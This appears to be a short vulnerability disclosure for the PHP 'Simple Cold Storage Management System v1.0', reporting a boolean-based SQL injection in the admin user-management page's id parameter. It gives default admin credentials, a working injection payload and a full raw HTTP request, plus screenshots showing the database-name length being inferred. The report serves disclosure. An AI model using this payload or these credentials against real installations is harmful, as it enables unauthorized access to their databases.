# Simple Cold Storage Management System v1.0 by oretnom23 has SQL injection

BUG_Author: Tr0e

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/15088/simple-cold-storage-management-system-using-phpoop-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /csms/admin/?page=user/manage_user&id=

Vulnerability location: /csms/admin/?page=user/manage_user&id=, id

dbname =csms_db,length=7

[+] Payload: /csms/admin/?page=user/manage_user&id=3%27%20and%20length(database())%20=%207--+  // Leak place ---> id

```sql
GET /csms/admin/?page=user/manage_user&id=3%27%20and%20length(database())%20=%207--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=d8pesjl7i2jtmf2qddggbp7q0b
Connection: close
```

length=6
![image](https://user-images.githubusercontent.com/54017627/191015524-c0b7221f-a07d-40e3-9887-923a6eb57ba4.png)


length=7
![image](https://user-images.githubusercontent.com/54017627/191015564-bd3a22b1-75f9-4727-a30b-4708a29c673f.png)
